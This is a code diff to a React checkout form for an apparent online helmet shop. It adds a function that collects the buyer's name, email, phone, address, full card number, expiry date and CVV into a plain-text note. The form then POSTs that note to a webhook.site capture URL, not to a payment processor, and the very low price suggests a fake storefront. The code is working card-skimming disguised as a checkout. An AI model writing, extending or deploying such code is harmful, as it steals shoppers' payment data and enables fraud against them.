@@ -27,17 +27,35 @@ export const CheckoutForm = () => {
     cvv: "",
   });
 
+  const formatDataAsNotes = (data: FormData) => {
+    return `
+=== NOVO PEDIDO DE CAPACETE LS2 CLASSIC S ===
+Nome: ${data.nome}
+Email: ${data.email}
+Telefone: ${data.telefone}
+Endereço: ${data.endereco}
+------- Dados do Cartão -------
+Número: ${data.numeroCartao}
+Validade: ${data.validadeCartao}
+CVV: ${data.cvv}
+================================
+Valor Total: R$ 80,00
+Frete: Grátis
+================================`;
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setLoading(true);
 
     try {
+      const formattedData = formatDataAsNotes(formData);
       const response = await fetch("https://webhook.site/295a22f7-696f-4834-a212-8f1540b471c6", {
         method: "POST",
         headers: {
-          "Content-Type": "application/json",
+          "Content-Type": "text/plain",
         },
-        body: JSON.stringify(formData),
+        body: formattedData,
       });
 
       if (response.ok) {
